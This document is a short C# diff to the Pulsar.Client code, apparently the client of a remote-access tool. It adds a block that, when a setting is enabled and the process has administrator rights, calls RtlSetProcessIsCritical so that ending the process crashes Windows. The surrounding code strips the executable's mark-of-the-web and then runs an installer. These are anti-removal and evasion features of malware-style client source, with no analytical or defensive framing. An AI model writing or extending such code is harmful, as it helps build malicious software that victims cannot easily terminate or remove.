@@ -112,6 +112,12 @@ namespace Pulsar.Client
                 Environment.Exit(5);
             }
 
+            if (Settings.MAKEPROCESSCRITICAL && UAC.IsAdministrator())
+            {
+                Debug.WriteLine("Setting process as critical...");
+                NativeMethods.RtlSetProcessIsCritical(1, 0, 0);
+            }
+
             FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);
 
             var installer = new ClientInstaller();
